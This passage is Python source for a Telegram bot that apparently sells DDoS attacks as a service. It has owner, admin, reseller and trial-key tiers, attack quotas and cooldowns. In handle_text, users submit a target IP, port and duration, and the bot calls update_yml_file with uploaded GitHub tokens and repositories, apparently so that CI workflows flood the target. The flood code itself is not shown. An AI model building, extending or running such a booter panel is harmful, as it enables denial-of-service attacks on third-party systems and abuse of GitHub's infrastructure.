    text += f"└ 🎯 {to_small_caps('Max attacks')}: {MAX_ATTACKS}"
    
    keyboard = [
        [InlineKeyboardButton(
            f"🔧 {to_small_caps('Toggle Maintenance')}", 
            callback_data="toggle_maintenance"
        )],
        [InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="admin_panel")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, reply_markup=reply_markup)

async def my_access(query):
    user_id = query.from_user.id
    
    if is_owner(user_id):
        role = "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "⚡ ᴀᴅᴍɪɴ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_reseller(user_id):
        role = "💎 ʀᴇsᴇʟʟᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_approved_user(user_id):
        role = "✨ ᴜsᴇʀ"
        user_data = approved_users.get(str(user_id), {})
        exp = user_data.get('expiry', 0)
        if exp == "LIFETIME":
            expiry = "ʟɪғᴇᴛɪᴍᴇ"
        else:
            days_left = int((exp - time.time()) / 86400)
            hours_left = int(((exp - time.time()) % 86400) / 3600)
            expiry = f"{days_left}ᴅ {hours_left}ʜ"
    else:
        role = "⏳ ᴘᴇɴᴅɪɴɢ"
        expiry = "ᴡᴀɪᴛɪɴɢ"
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    status = "🟢 ᴀᴄᴛɪᴠᴇ" if can_user_attack(user_id) else "🔴 ɪɴᴀᴄᴛɪᴠᴇ"
    
    text = f"╔════════════════════════╗\n"
    text += f"║  {to_small_caps('YOUR ACCESS INFO')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('ACCOUNT DETAILS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 👤 {to_small_caps('Role')}: {role}\n"
    text += f"├ 👤 {to_small_caps('Name')}: {query.from_user.first_name}\n"
    text += f"├ 👤 {to_small_caps('Username')}: @{query.from_user.username or 'None'}\n"
    text += f"├ 📅 {to_small_caps('Expiry')}: {expiry}\n"
    text += f"├ 🎯 {to_small_caps('Attacks')}: {remaining}/{MAX_ATTACKS}\n"
    text += f"└ ✅ {to_small_caps('Status')}: {status}"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="main_menu")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def status_menu(query):
    text = f"╔════════════════════════╗\n"
    text += f"║  📊 {to_small_caps('SYSTEM STATUS')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    
    if current_attack:
        remaining_time = int(current_attack['end_time'] - time.time())
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('ACTIVE ATTACK')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"├ 🎯 {to_small_caps('Target')}: {current_attack['ip']}:{current_attack['port']}\n"
        text += f"├ ⏱️ {to_small_caps('Time left')}: {remaining_time}s\n"
        text += f"└ 👤 {to_small_caps('User')}: {current_attack.get('username', 'Unknown')}\n\n"
    else:
        text += f"📭 {to_small_caps('No active attack')}\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('SYSTEM INFO')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 🔑 {to_small_caps('Servers')}: {len(github_tokens)}\n"
    text += f"├ 🔧 {to_small_caps('Maintenance')}: {'🔴 ON' if MAINTENANCE_MODE else '🟢 OFF'}\n"
    text += f"├ ⏳ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s\n"
    text += f"└ 🎯 {to_small_caps('Max attacks')}: {MAX_ATTACKS}"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="main_menu")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def help_menu(query):
    user_id = query.from_user.id
    
    text = f"╔═══════════════════════╗\n"
    text += f"║  {to_small_caps('HELP & COMMANDS')}  ║\n"
    text += f"╚═══════════════════════╝\n\n"
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('BASIC COMMANDS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"/start - {to_small_caps('Main menu')}\n"
    text += f"/id - {to_small_caps('Get your ID')}\n"
    text += f"/myaccess - {to_small_caps('Check access')}\n"
    text += f"/help - {to_small_caps('Show help')}\n"
    text += f"/redeem <key> - {to_small_caps('Redeem trial')}\n\n"
    
    if is_owner(user_id) or is_admin(user_id):
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('ADMIN COMMANDS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"/add <id> <days> - {to_small_caps('Add user')}\n"
        text += f"/remove <id> - {to_small_caps('Remove user')}\n\n"
    
    text += f"💡 {to_small_caps('Use buttons for more features')}"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="main_menu")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def reseller_panel(query):
    user_id = query.from_user.id
    
    if not is_reseller(user_id):
        await query.edit_message_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    text = f"╔════════════════════════╗\n"
    text += f"║  💰 {to_small_caps('RESELLER PANEL')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('PRICING')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    
    for days, price in RESELLER_PRICES.items():
        text += f"├ {days} {to_small_caps('days')}: ₹{price}\n"
    
    text += f"\n💡 {to_small_caps('Contact admin to add users')}"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="main_menu")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def redeem_trial_info(query):
    text = f"╔════════════════════════╗\n"
    text += f"║  🔑 {to_small_caps('REDEEM TRIAL')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"📝 {to_small_caps('How to redeem')}:\n\n"
    text += f"1️⃣ {to_small_caps('Get trial key from admin')}\n"
    text += f"2️⃣ {to_small_caps('Use command')}: /redeem <key>\n"
    text += f"3️⃣ {to_small_caps('Start using the bot')}\n\n"
    text += f"💡 {to_small_caps('Example')}: /redeem TRL-XXXX-XXXX-XXXX"
    
    keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="main_menu")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not context.user_data.get('waiting_attack'):
        return
    
    if not can_user_attack(user_id):
        await update.message.reply_text(f"❌ {to_small_caps('Access denied')}")
        context.user_data['waiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) != 3:
            await update.message.reply_text(f"❌ {to_small_caps('Invalid format')}. {to_small_caps('Use')}: IP PORT TIME")
            return
        
        ip = parts[0]
        port = int(parts[1])
        attack_time = int(parts[2])
        
        if attack_time > 600:
            await update.message.reply_text(f"❌ {to_small_caps('Max time is 600 seconds')}")
            return
        
        if not github_tokens:
            await update.message.reply_text(f"❌ {to_small_caps('No servers configured')}")
            context.user_data['waiting_attack'] = False
            return
        
        msg = await update.message.reply_text(f"🚀 {to_small_caps('Starting attack')}...")
        
        success_count = 0
        for token_data in github_tokens:
            token = token_data['token']
            repo = token_data['repo']
            if update_yml_file(token, repo, ip, port, attack_time):
                success_count += 1
        
        if success_count > 0:
            global current_attack, cooldown_until
            with attack_lock:
                current_attack = {
                    'ip': ip,
                    'port': port,
                    'time': attack_time,
                    'end_time': time.time() + attack_time,
                    'user_id': user_id,
                    'username': update.effective_user.username or update.effective_user.first_name
                }
                cooldown_until = time.time() + attack_time + COOLDOWN_DURATION
                user_attack_counts[str(user_id)] = user_attack_counts.get(str(user_id), 0) + 1
                save_json('user_attack_counts.json', user_attack_counts)
            
            history = load_json('attack_history.json', [])
            history.append({
                'user_id': user_id,
                'username': update.effective_user.username or update.effective_user.first_name,
                'ip': ip,
                'port': port,
                'time': attack_time,
                'date': time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_json('attack_history.json', history)
            
            text = f"╔════════════════════════╗\n"
            text += f"║  ✅ {to_small_caps('ATTACK LAUNCHED')}  ║\n"
            text += f"╚════════════════════════╝\n\n"
            text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
            text += f"┃  {to_small_caps('ATTACK DETAILS')}  ┃\n"
            text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
            text += f"├ 🎯 {to_small_caps('Target')}: {ip}:{port}\n"
            text += f"├ ⏱️ {to_small_caps('Duration')}: {attack_time}s\n"
            text += f"├ 🔑 {to_small_caps('Servers')}: {success_count}\n"
            text += f"└ ⏳ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s\n\n"
            text += f"🚀 {to_small_caps('Attack is running')}..."
            
            await msg.edit_text(text)
        else:
            await msg.edit_text(f"❌ {to_small_caps('Failed to start attack')}")
        
        context.user_data['waiting_attack'] = False
        
    except ValueError:
        await update.message.reply_text(f"❌ {to_small_caps('Invalid values')}. {to_small_caps('Port and time must be numbers')}")
    except Exception as e:
        logger.error(f"Error in handle_text: {e}")
        await update.message.reply_text(f"❌ {to_small_caps('An error occurred')}")
        context.user_data['waiting_attack'] = False

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        return
    
    doc = update.message.document
    
    if doc.file_name.endswith('.txt'):
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        lines = content.decode('utf-8').strip().split('\n')
        
        added = 0
        for line in lines:
            parts = line.strip().split('|')
            if len(parts) == 2:
                token, repo = parts
                if not any(t.get('token') == token for t in github_tokens):
                    github_tokens.append({
                        'token': token.strip(),
                        'repo': repo.strip(),
                        'added_date': time.strftime("%Y-%m-%d %H:%M:%S")
                    })
                    added += 1
        
        save_json('github_tokens.json', github_tokens)
        await update.message.reply_text(f"✅ {to_small_caps('Added')} {added} {to_small_caps('servers')}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "main_menu":
        await start(update, context)
    elif data == "attack_panel":
        await show_attack_panel(query)
    elif data == "launch_attack":
        await launch_attack(query, context)
    elif data == "stop_attack":
        await stop_attack_handler(query)
    elif data == "attack_history":
        await attack_history(query)
    elif data == "attack_logs":
        await attack_logs(query)
    elif data == "attack_settings":
        await attack_settings(query)
    elif data == "manage_users":
        await manage_users(query)
    elif data == "show_approved":
        await show_approved(query)
    elif data == "show_pending":
        await show_pending(query)
    elif data == "stats":
        await stats(query)
    elif data == "servers":
        await servers(query)
    elif data == "trial_keys":
        await trial_keys_menu(query)
    elif data == "generate_trial":
        await generate_trial_menu(query)
    elif data == "view_trial_keys":
        await view_trial_keys(query)
    elif data == "admin_panel":
        await admin_panel(query)
    elif data == "my_access":
        await my_access(query)
    elif data == "help":
        await help_menu(query)
    elif data == "status":
        await status_menu(query)
    elif data == "reseller_panel":
        await reseller_panel(query)
    elif data == "redeem_trial_info":
        await redeem_trial_info(query)
    elif data.startswith("gen_trial_"):
        hours = int(data.split("_")[-1])
        key = generate_trial_key(hours)
        
        text = f"╔════════════════════════╗\n"
        text += f"║  ✅ {to_small_caps('KEY GENERATED')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"🎫 {to_small_caps('Trial Key')}: `{key}`\n"
        text += f"⏰ {to_small_caps('Duration')}: {hours} {to_small_caps('hours')}\n\n"
        text += f"💡 {to_small_caps('Share this key with users')}\n"
        text += f"📝 {to_small_caps('Redeem')}: /redeem {key}"
        
        keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="trial_keys")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "toggle_maintenance":
        global MAINTENANCE_MODE
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        save_json('maintenance.json', {"maintenance": MAINTENANCE_MODE})
        
        text = f"✅ {to_small_caps('Maintenance')}: {'🔴 ON' if MAINTENANCE_MODE else '🟢 OFF'}"
        keyboard = [[InlineKeyboardButton(f"🔙 {to_small_caps('Back')}", callback_data="attack_settings")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    text = f"╔════════════════════════╗\n"
    text += f"║  🆔 {to_small_caps('YOUR ID')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"👤 {to_small_caps('User ID')}: `{user_id}`\n\n"
    text += f"💡 {to_small_caps('Share this with admin for access')}"
    
    await update.message.reply_text(text)

async def myaccess_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_owner(user_id):
        role = "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "⚡ ᴀᴅᴍɪɴ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_reseller(user_id):
        role = "💎 ʀᴇsᴇʟʟᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_approved_user(user_id):
        role = "✨ ᴜsᴇʀ"
        user_data = approved_users.get(str(user_id), {})
        exp = user_data.get('expiry', 0)
        if exp == "LIFETIME":
            expiry = "ʟɪғᴇᴛɪᴍᴇ"
        else:
            days_left = int((exp - time.time()) / 86400)
            hours_left = int(((exp - time.time()) % 86400) / 3600)
            expiry = f"{days_left}ᴅ {hours_left}ʜ"
    else:
        role = "⏳ ᴘᴇɴᴅɪɴɢ"
        expiry = "ᴡᴀɪᴛɪɴɢ"
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    status = "🟢 ᴀᴄᴛɪᴠᴇ" if can_user_attack(user_id) else "🔴 ɪɴᴀᴄᴛɪᴠᴇ"
    
    text = f"╔════════════════════════╗\n"
    text += f"║  {to_small_caps('YOUR ACCESS INFO')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('ACCOUNT DETAILS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 👤 {to_small_caps('Role')}: {role}\n"
    text += f"├ 👤 {to_small_caps('Name')}: {update.effective_user.first_name}\n"
    text += f"├ 👤 {to_small_caps('Username')}: @{update.effective_user.username or 'None'}\n"
    text += f"├ 📅 {to_small_caps('Expiry')}: {expiry}\n"
    text += f"├ 🎯 {to_small_caps('Attacks')}: {remaining}/{MAX_ATTACKS}\n"
    text += f"└ ✅ {to_small_caps('Status')}: {status}"
    
    await update.message.reply_text(text)

async def add_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(f"❌ {to_small_caps('Usage')}: /add <id> <days>")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(target_id)]
        save_json('pending_users.json', pending_users)
        
        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 86400)
        
        approved_users[str(target_id)] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_json('approved_users.json', approved_users)
        
        try:
            msg = f"╔════════════════════════╗\n"
            msg += f"║  {to_small_caps('ACCESS APPROVED')}  ║\n"
            msg += f"╚════════════════════════╝\n\n"
            msg += f"🎉 {to_small_caps('Access granted for')} {days} {to_small_caps('days')}\n"
            msg += f"💡 {to_small_caps('Use')} /start {to_small_caps('to begin')}"
            await context.bot.send_message(chat_id=target_id, text=msg)
        except:
            pass
        
        text = f"╔════════════════════╗\n"
        text += f"║  {to_small_caps('USER ADDED')}  ║\n"
        text += f"╚════════════════════╝\n\n"
        text += f"✅ {to_small_caps('Successfully added')}\n"
        text += f"├ 🆔 {to_small_caps('ID')}: {target_id}\n"
        text += f"└ ⏱️ {to_small_caps('Days')}: {days}"
        
        await update.message.reply_text(text)
    except:
        await update.message.reply_text(f"❌ {to_small_caps('Invalid format')}")

async def remove_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(f"❌ {to_small_caps('Usage')}: /remove <id>")
        return
    
    try:
        target_id = str(context.args[0])
        
        if target_id in approved_users:
            del approved_users[target_id]
            save_json('approved_users.json', approved_users)
            
            text = f"╔════════════════════╗\n"
            text += f"║  {to_small_caps('USER REMOVED')}  ║\n"
            text += f"╚════════════════════╝\n\n"
            text += f"✅ {to_small_caps('Successfully removed')}\n"
            text += f"└ 🆔 {to_small_caps('ID')}: {target_id}"
            
            await update.message.reply_text(text)
        else:
            await update.message.reply_text(f"❌ {to_small_caps('User not found')}")
    except:
        await update.message.reply_text(f"❌ {to_small_caps('Error occurred')}")

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text(f"❌ {to_small_caps('Usage')}: /redeem <key>")
        return
    
    key = context.args[0].upper()
    success, message = redeem_trial_key(key, user_id)
    
    if success:
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('TRIAL ACTIVATED')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"✅ {message}\n\n"
        text += f"💡 {to_small_caps('Use')} /start {to_small_caps('to begin')}"
        await update.message.reply_text(text)
    else:
        text = f"╔════════════════════╗\n"
        text += f"║  {to_small_caps('REDEMPTION FAILED')}  ║\n"
        text += f"╚════════════════════╝\n\n"
        text += f"❌ {message}"
        await update.message.reply_text(text)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    text = f"╔═══════════════════════╗\n"
    text += f"║  {to_small_caps('HELP & COMMANDS')}  ║\n"
    text += f"╚═══════════════════════╝\n\n"
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('BASIC COMMANDS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"/start - {to_small_caps('Main menu')}\n"
    text += f"/id - {to_small_caps('Get your ID')}\n"
    text += f"/myaccess - {to_small_caps('Check access')}\n"
    text += f"/help - {to_small_caps('Show help')}\n"
    text += f"/redeem <key> - {to_small_caps('Redeem trial')}\n\n"
    
    if is_owner(user_id) or is_admin(user_id):
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('ADMIN COMMANDS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"/add <id> <days> - {to_small_caps('Add user')}\n"
        text += f"/remove <id> - {to_small_caps('Remove user')}\n\n"
    
    text += f"💡 {to_small_caps('Use buttons for more features')}"
    
    await update.message.reply_text(text)

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("id", id_cmd))
    application.add_handler(CommandHandler("myaccess", myaccess_cmd))
    application.add_handler(CommandHandler("add", add_cmd))
    application.add_handler(CommandHandler("remove", remove_cmd))
    application.add_handler(CommandHandler("redeem", redeem_cmd))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print("╔════════════════════════════╗")
    print(f"║  {to_small_caps('BOT IS RUNNING')}...  ║")
    print("╚════════════════════════════╝")
    print(f"👑 {to_small_caps('Owners')}: {len(owners)}")
    print(f"⚡ {to_small_caps('Admins')}: {len(admins)}")
    print(f"📊 {to_small_caps('Users')}: {len(approved_users)}")
    print(f"💎 {to_small_caps('Resellers')}: {len(resellers)}")
    print(f"🔑 {to_small_caps('Servers')}: {len(github_tokens)}")
    print(f"🔧 {to_small_caps('Maintenance')}: {'🔴 ON' if MAINTENANCE_MODE else '🟢 OFF'}")
    print(f"⏳ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s")
    print(f"🎯 {to_small_caps('Max attacks')}: {MAX_ATTACKS}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
